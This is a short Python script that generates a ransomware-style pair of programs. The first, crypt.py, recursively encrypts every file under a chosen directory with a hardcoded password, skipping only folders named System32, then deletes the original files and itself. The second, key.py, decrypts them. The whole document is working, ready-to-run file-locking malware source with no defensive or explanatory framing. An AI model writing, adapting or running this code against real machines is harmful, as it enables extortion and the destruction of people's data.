import os
directory = input("Write the root directory(type 'cur' if you want to crypt current directory): ")
if directory == 'cur':
    directory = os.getcwd()
password = input("Write password: ")
print("---------------------------------------------------------------")


with open('crypt.py', 'w') as crypt:
    crypt.write('''import os
import sys


def crypt(file):
    import pyAesCrypt
    print("---------------------------------------------------------------")
    password = "'''+str(password)+'''"
    buffer_size = 512*1024
    pyAesCrypt.encryptFile(str(file), str(file)+".crp", password, buffer_size)
    print("[crypted] '"+str(file)+".crp'")
    os.remove(file)
    

def walk(directory):
    for name in os.listdir(directory):
        if name != 'System32':
            path = os.path.join(directory, name)
            if os.path.isfile(path):
                crypt(path)
            else:
                walk(path)
                
                
walk("'''+str(directory)+'''")
os.remove(str(sys.argv[0]))''')
    print("[+] File 'crypt.py' successfully created!")


with open('key.py', 'w') as key:
    key.write('''import os
import sys


def decrypt(file):
    import pyAesCrypt
    print("---------------------------------------------------------------")
    password = "'''+str(password)+'''"
    buffer_size = 512*1024
    pyAesCrypt.decryptFile(str(file), str(os.path.splitext(file)[0]), password,
                           buffer_size)
    print("[decrypted] '"+str(os.path.splitext(file)[0])+"'")
    os.remove(file)


def walk(directory):
    for name in os.listdir(directory):
        path = os.path.join(directory, name)
        if os.path.isfile(path):
            try:
                decrypt(path)
            except:
                pass
        else:
            walk(path)


walk("'''+str(directory)+'''")
print("---------------------------------------------------------------")
os.remove(str(sys.argv[0]))''')
    print("[+] File 'key.py' successfully created!")
print("---------------------------------------------------------------")